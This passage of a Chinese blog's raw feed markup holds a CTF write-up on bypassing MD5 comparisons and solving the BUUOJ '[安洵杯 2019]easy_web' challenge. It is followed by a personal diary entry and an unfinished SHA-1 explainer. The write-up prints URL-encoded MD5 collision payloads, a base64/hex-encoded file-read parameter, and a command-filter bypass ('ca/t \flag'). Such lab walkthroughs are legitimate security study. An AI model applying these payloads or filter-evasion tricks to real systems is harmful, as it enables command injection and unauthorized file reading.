href="https://segmentfault.com/a/1190000039189857">https://segmentfault.com/a/1190000039189857</a><br>这是生成工具。按照生成代码就行。<br>我一直以为是我的代码生成的有问题。询问<code>h3师傅</code>我是真没想到他一下就弄出来了。然后他将payload给了我，我复现但是还是不行。我换了很多php版本，最后还是不行。</p><p>然后最后经过<code>天上星</code>师傅的提醒，也许是抓包的问题（有时候抓包的时候不能直接改成POST）。可惜我没有在火狐里装<code>hackbar</code>，然后就又去装。</p><p>接着我又去询问<code>h3师傅</code>原因，他说他可以。可能使我的bp有问题。我实在不想去解决这个问题了。接下来直接写复现代码。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282059387.png" alt="QQ截图20220228205918"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">a=<span class="hljs-number">1</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span>u<span class="hljs-meta">%</span><span class="hljs-number">60</span><span class="hljs-meta">%</span>ACZ<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">23</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>A<span class="hljs-meta">%</span>C<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>A<span class="hljs-meta">%</span><span class="hljs-number">7</span>E<span class="hljs-meta">%</span><span class="hljs-number">94</span><span class="hljs-meta">%</span>AA<span class="hljs-meta">%</span><span class="hljs-number">5</span>D<span class="hljs-meta">%</span><span class="hljs-number">1</span>A<span class="hljs-meta">%</span>DA<span class="hljs-meta">%</span>B<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">98</span><span class="hljs-meta">%</span>DA<span class="hljs-meta">%</span><span class="hljs-number">1</span>A<span class="hljs-meta">%</span><span class="hljs-number">29</span>Aq<span class="hljs-meta">%</span><span class="hljs-number">0</span>DoP<span class="hljs-meta">%</span>FE<span class="hljs-meta">%</span><span class="hljs-number">7</span>F<span class="hljs-meta">%</span><span class="hljs-number">15</span>uB<span class="hljs-meta">%</span><span class="hljs-number">0</span>B<span class="hljs-meta">%</span>C<span class="hljs-number">9</span><span class="hljs-meta">%</span><span class="hljs-number">82</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>B<span class="hljs-meta">%</span>F<span class="hljs-number">7</span><span class="hljs-meta">%</span>E<span class="hljs-number">1</span><span class="hljs-meta">%</span>EAe<span class="hljs-meta">%</span><span class="hljs-number">0</span>D<span class="hljs-meta">%</span><span class="hljs-number">87</span><span class="hljs-meta">%</span>EB<span class="hljs-meta">%</span>E<span class="hljs-number">7</span><span class="hljs-meta">%</span>D<span class="hljs-number">6</span><span class="hljs-meta">%</span><span class="hljs-number">11</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>F<span class="hljs-meta">%</span>C<span class="hljs-number">64</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>BI<span class="hljs-meta">%</span>D<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>B<span class="hljs-meta">%</span>A<span class="hljs-number">9</span><span class="hljs-meta">%</span><span class="hljs-number">88</span><span class="hljs-meta">%</span>BE-<span class="hljs-meta">%</span>F<span class="hljs-number">0</span>J<span class="hljs-meta">%</span><span class="hljs-number">24</span>wh<span class="hljs-meta">%</span><span class="hljs-number">2</span>Bh<span class="hljs-number">6</span>C<span class="hljs-meta">%</span>EA<span class="hljs-meta">%</span>AFb<span class="hljs-meta">%</span>C<span class="hljs-number">5</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>A<span class="hljs-meta">%</span>CD<span class="hljs-meta">%</span>AF<span class="hljs-meta">%</span><span class="hljs-number">3</span>Ar<span class="hljs-meta">%</span>F<span class="hljs-number">0</span>z<span class="hljs-meta">%</span><span class="hljs-number">26</span><span class="hljs-meta">%</span><span class="hljs-number">98</span><span class="hljs-meta">%</span><span class="hljs-number">22</span><span class="hljs-meta">%</span>F<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">07</span><span class="hljs-meta">%</span><span class="hljs-number">83</span><span class="hljs-meta">%</span><span class="hljs-number">12</span><span class="hljs-meta">%</span>F<span class="hljs-number">66</span>y<span class="hljs-meta">%</span>E<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>C<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<span class="hljs-meta">%</span><span class="hljs-number">0</span>C<span class="hljs-number">5</span>p<span class="hljs-meta">%</span>F<span class="hljs-number">7</span>PH<span class="hljs-meta">%</span><span class="hljs-number">5</span>D<span class="hljs-meta">%</span>DDq<span class="hljs-meta">%</span><span class="hljs-number">9</span>F<span class="hljs-meta">%</span>FE<span class="hljs-meta">%</span><span class="hljs-number">2</span>Fw<span class="hljs-meta">%</span>B<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">82</span><span class="hljs-meta">%</span><span class="hljs-number">27</span><span class="hljs-meta">%</span>D<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>F<span class="hljs-meta">%</span>CD<span class="hljs-meta">%</span><span class="hljs-number">99</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>F<span class="hljs-number">4</span>C<span class="hljs-meta">%</span><span class="hljs-number">9</span>D<span class="hljs-meta">%</span>C<span class="hljs-number">7</span>P<span class="hljs-meta">%</span>B<span class="hljs-number">0</span><span class="hljs-meta">%</span>C<span class="hljs-number">3</span>P<span class="hljs-meta">%</span>D<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">93</span><span class="hljs-meta">%</span>FFr<span class="hljs-meta">%</span>B<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>A<span class="hljs-meta">%</span>EEs<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>A<span class="hljs-meta">%</span><span class="hljs-number">08</span>&amp;b=<span class="hljs-number">1</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span>u<span class="hljs-meta">%</span><span class="hljs-number">60</span><span class="hljs-meta">%</span>ACZ<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">23</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>A<span class="hljs-meta">%</span>C<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>A<span class="hljs-meta">%</span><span class="hljs-number">7</span>E<span class="hljs-meta">%</span><span class="hljs-number">94</span><span class="hljs-meta">%</span>AA<span class="hljs-meta">%</span><span class="hljs-number">5</span>D<span class="hljs-meta">%</span><span class="hljs-number">1</span>A<span class="hljs-meta">%</span>DA<span class="hljs-meta">%</span>B<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">98</span><span class="hljs-meta">%</span>DA<span class="hljs-meta">%</span><span class="hljs-number">1</span>A<span class="hljs-meta">%</span>A<span class="hljs-number">9</span>Aq<span class="hljs-meta">%</span><span class="hljs-number">0</span>DoP<span class="hljs-meta">%</span>FE<span class="hljs-meta">%</span><span class="hljs-number">7</span>F<span class="hljs-meta">%</span><span class="hljs-number">15</span>uB<span class="hljs-meta">%</span><span class="hljs-number">0</span>B<span class="hljs-meta">%</span>C<span class="hljs-number">9</span><span class="hljs-meta">%</span><span class="hljs-number">82</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>B<span class="hljs-meta">%</span>F<span class="hljs-number">7</span><span class="hljs-meta">%</span>E<span class="hljs-number">1</span><span class="hljs-meta">%</span>EAe<span class="hljs-meta">%</span><span class="hljs-number">0</span>D<span class="hljs-meta">%</span><span class="hljs-number">87</span><span class="hljs-meta">%</span>EB<span class="hljs-meta">%</span>E<span class="hljs-number">7</span><span class="hljs-meta">%</span>D<span class="hljs-number">6</span><span class="hljs-meta">%</span><span class="hljs-number">11</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>FF<span class="hljs-number">5</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>BI<span class="hljs-meta">%</span>D<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>B<span class="hljs-meta">%</span>A<span class="hljs-number">9</span><span class="hljs-meta">%</span><span class="hljs-number">88</span><span class="hljs-meta">%</span>BE-<span class="hljs-meta">%</span>F<span class="hljs-number">0</span>J<span class="hljs-meta">%</span><span class="hljs-number">24</span>w<span class="hljs-meta">%</span>E<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>Bh<span class="hljs-number">6</span>C<span class="hljs-meta">%</span>EA<span class="hljs-meta">%</span>AFb<span class="hljs-meta">%</span>C<span class="hljs-number">5</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>A<span class="hljs-meta">%</span>CD<span class="hljs-meta">%</span>AF<span class="hljs-meta">%</span><span class="hljs-number">3</span>Ar<span class="hljs-meta">%</span>F<span class="hljs-number">0</span>z<span class="hljs-meta">%</span><span class="hljs-number">26</span><span class="hljs-meta">%</span><span class="hljs-number">98</span><span class="hljs-meta">%</span><span class="hljs-number">22</span><span class="hljs-meta">%</span>F<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">07</span><span class="hljs-meta">%</span><span class="hljs-number">83</span><span class="hljs-meta">%</span><span class="hljs-number">12</span><span class="hljs-meta">%</span>F<span class="hljs-number">6</span><span class="hljs-meta">%</span>B<span class="hljs-number">6</span>y<span class="hljs-meta">%</span>E<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>C<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<span class="hljs-meta">%</span><span class="hljs-number">0</span>C<span class="hljs-number">5</span>p<span class="hljs-meta">%</span>F<span class="hljs-number">7</span>PH<span class="hljs-meta">%</span><span class="hljs-number">5</span>D<span class="hljs-meta">%</span>DDq<span class="hljs-meta">%</span><span class="hljs-number">9</span>F<span class="hljs-meta">%</span>FE<span class="hljs-meta">%</span><span class="hljs-number">2</span>Fw<span class="hljs-meta">%</span>B<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">82</span><span class="hljs-meta">%</span><span class="hljs-number">27</span><span class="hljs-meta">%</span>D<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>F<span class="hljs-meta">%</span>CD<span class="hljs-meta">%</span><span class="hljs-number">99</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>F<span class="hljs-meta">%</span>B<span class="hljs-number">4</span>B<span class="hljs-meta">%</span><span class="hljs-number">9</span>D<span class="hljs-meta">%</span>C<span class="hljs-number">7</span>P<span class="hljs-meta">%</span>B<span class="hljs-number">0</span><span class="hljs-meta">%</span>C<span class="hljs-number">3</span>P<span class="hljs-meta">%</span>D<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">93</span><span class="hljs-meta">%</span>FFr<span class="hljs-meta">%</span>B<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>A<span class="hljs-symbol">ns3</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>A<span class="hljs-meta">%</span><span class="hljs-number">08</span><br></code></pre></td></tr></table></figure><p>这里同样附上(<code>h3师傅</code>的)</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a<span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1U</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span>&amp;b<span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span><br></code></pre></td></tr></table></figure><h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> ((string)$_GET[<span class="hljs-string">&#x27;a&#x27;</span>]!==(string)$_GET[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; md5($_GET[<span class="hljs-string">&#x27;a&#x27;</span>])===md5($_GET[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>    echo <span class="hljs-string">&quot;Xsw6_a&quot;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131658.png" alt="QQ截图20220228210215"></p><h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h1><h2 id="初步"><a href="#初步" class="headerlink" title="初步"></a>初步</h2><p>打开题目就看到url：<a href="http://8c10f0a4-759d-4e70-a624-2f513d4feada.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=">http://8c10f0a4-759d-4e70-a624-2f513d4feada.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</a></p><p>img后面肯定是加密（F12打开就看到base64），cmd用来干什么？执行命令呗。<br>然后base64解密一下。emmm，什么玩意。两次base64解码。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131468.png" alt="QQ截图20220228210724"></p><p>属实看不懂。直接查看题目给的源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<br></code></pre></td></tr></table></figure><p><code>hex2bin</code><strong>解码十六进制编码的二进制字符串。</strong><br>解码为555.png。</p><h2 id="高潮"><a href="#高潮" class="headerlink" title="高潮"></a>高潮</h2><p>很显然这里我们在看过源码之后，可以直接继续往下读。但是在真正的比赛的时候。这时候我们应该</p><p><code>$file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));</code></p><p>这时候我们应该将img改成index.php方向加密得到。</p><p>所用网址：</p><p><a href="https://tool.lu/hexstr/">https://tool.lu/hexstr/</a></p><p><a href="https://tool.oschina.net/encrypt?type=3">https://tool.oschina.net/encrypt?type=3</a></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">TmprMlpUWTBOalUzT<span class="hljs-number">0</span>RKbE<span class="hljs-number">56</span>QTJPRG<span class="hljs-symbol">N3</span><br></code></pre></td></tr></table></figure><p>然后F12，查看到。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282124825.png" alt="QQ截图20220228212429"></p><p>解码后看到源码。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131307.png" alt="QQ截图20220228212459"></p><p>后续就是绕过MD5（非常可恶！）<br>这里还有个小tips。（源码中过滤了一些命令。）<br>可以这么构造（ca&#x2F;t \flag）</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131419.png" alt="QQ截图20220228212459"></p><p>感谢<code>h3师傅、天上星师傅</code></p><p>！</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>想念宝贝</title>
    <link href="/2022/02/27/%E6%83%B3%E5%BF%B5%E5%AE%9D%E8%B4%9D/"/>
    <url>/2022/02/27/%E6%83%B3%E5%BF%B5%E5%AE%9D%E8%B4%9D/</url>
    
    <content type="html"><![CDATA[<p>每一周总结写一篇叭（争取），希望宝贝不会觉得平常学东西忘了她。虽然说是在一个学校，但是因为疫情原因隔了十万八千里。</p><p>今天还跟婆婆打电话了，婆婆身体之前一直不好，今天终于好些了。（希望早点长大，可以赚点小钱，孝敬她老人家）</p><h1 id="有点想宝贝了"><a href="#有点想宝贝了" class="headerlink" title="有点想宝贝了"></a>有点想宝贝了</h1><p>前几天计划去峨眉山玩一圈（希望到时候不会下雨）。真的就离谱订酒店的票是真的贵（499一晚）。<br>下面是计划表。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202272111813.jpeg" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>学生时代的恋爱</category>
      
    </categories>
    
    
    <tags>
      
      <tag>爱情</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SHA-1算法</title>
    <link href="/2022/02/27/SHA-1%E7%AE%97%E6%B3%95/"/>
    <url>/2022/02/27/SHA-1%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="SHA-1算法"><a href="#SHA-1算法" class="headerlink" title="SHA-1算法"></a>SHA-1算法</h1><p><strong>SHA-1</strong>（英语：Secure Hash Algorithm 1，中文名：安全散列算法1）是一种密码散列函数。SHA-1可以生成一个被称为消息（小于2^64）摘要的160<a href="https://zh.wikipedia.org/wiki/%E4%BD%8D">位</a>（20<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82">字节</a>）散列值，散列值通常的呈现形式为40个<a href="https://zh.wikipedia.org/wiki/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6">十六进制</a>数。</p><h2 id="密码散列函数"><a href="#密码散列函数" class="headerlink" title="密码散列函数"></a>密码散列函数</h2><p><strong>密码散列函数</strong>（英语：Cryptographic hash function），又译为<strong>加密散列函数</strong>、<strong>密码散列函数</strong>、<strong>加密散列函数</strong>，是<a href="https://zh.wikipedia.org/wiki/%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B8">散列函数</a>的一种。它被认为是一种<a href="https://zh.wikipedia.org/wiki/%E5%96%AE%E5%90%91%E5%87%BD%E6%95%B8">单向函数</a>，也就是说极其难以由散列函数输出的结果，回推输入的资料是什么。这样的单向函数被称为“现代密码学的驮马”。</p><h2 id="SHA-1算法实现的具体步骤"><a href="#SHA-1算法实现的具体步骤" class="headerlink" title="SHA-1算法实现的具体步骤"></a>SHA-1算法实现的具体步骤</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202272048527.jpg" alt="153211996026408701"></p><h3 id="术语的概念"><a href="#术语的概念" class="headerlink" title="术语的概念"></a>术语的概念</h3><h4 id="1位-Bit-，字节（Byte）和字（Word）"><a href="#1位-Bit-，字节（Byte）和字（Word）" class="headerlink" title="1位(Bit)，字节（Byte）和字（Word）"></a>1位(Bit)，字节（Byte）和字（Word）</h4><p>SHA1始终把消息当成一个位（bit）字符串来处理。本文中，一个“字”（Word）是32位，而一个“字节”（Byte）是8位。比如，字符串“abc”可以被转换成一个位字符串：<code>01100001 01100010 01100011</code>。它也可以被表示成16进制字符串: <code>0x616263</code>。</p><h4 id="运算符和符号"><a href="#运算符和符号" class="headerlink" title="运算符和符号"></a>运算符和符号</h4><p>下面的逻辑运算符都被运用于“字”（Word）</p><p>X<code>^</code>、<code>&amp;</code>Y  &#x3D; X， Y逻辑与</p><p>X <code>\/</code> Y  &#x3D; X， Y逻辑或</p><p>X <code>XOR</code> Y&#x3D; X， Y逻辑异或</p><p><code>~</code>X   &#x3D;  X逻辑取反</p><p>X<code>+</code>Y定义如下：</p><p>字 X 和 Y 代表两个整数 x 和y, 其中 0 &lt;&#x3D; x &lt; 2^32 且 0 &lt;&#x3D; y &lt; 2^32. 令整数z &#x3D; (x + y) mod 2^32. 这时候 0 &lt;&#x3D; z &lt; 2^32. 将z转换成字Z, 那么就是 Z &#x3D; X + Y.</p><p>循环左移位操作符Sn(X)。X是一个字，n是一个整数，0&lt;&#x3D;n&lt;&#x3D;32。Sn(X) &#x3D; (X&lt;&lt;n)OR(X&gt;&gt;32-n)</p><p><strong>X&lt;&lt;n定义如下</strong>：抛弃最左边的n位数字，将各个位依次向左移动n位，然后用0填补右边的n位（最后结果还是32位）。</p><p><strong>X&gt;&gt;n定义如下</strong>：X&gt;&gt;n是抛弃右边的n位，将各个位依次向右移动n位，然后在左边的n位填0。因此可以叫Sn(X)位循环移位运算</p><h3 id="将消息摘要转换成位字符串"><a href="#将消息摘要转换成位字符串" class="headerlink" title="将消息摘要转换成位字符串"></a>将消息摘要转换成位字符串</h3><p>因为在Sha-1算法中，它的输入必须为位，所以我们首先要将其转化为位字符串。我们以“abc”字符串来说明问题。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 